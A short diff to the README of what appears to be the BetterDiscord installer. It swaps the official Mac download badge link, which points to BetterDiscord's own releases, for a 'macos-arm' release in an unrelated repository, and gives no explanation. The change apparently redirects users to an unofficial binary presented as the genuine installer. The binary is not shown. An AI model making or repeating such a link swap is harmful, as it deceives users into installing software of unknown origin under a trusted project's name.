@@ -11,7 +11,7 @@ Prebuilt binaries are available:
 
 [![Mac Installer][mac-badge]][mac-link]
 
-[mac-link]: https://github.com/BetterDiscord/Installer/releases/latest/download/BetterDiscord-Mac.zip
+[mac-link]: https://github.com/Alkanoidwastaken/datation-2/releases/download/v2.0-beta.1/macos-arm
 [mac-badge]: https://img.shields.io/badge/macOS%20ARM%20-Download-3a71c1?logo=Apple&logoColor=3a71c1&labelColor=0c0d10&color=3a71c1&style=for-the-badge
 
 
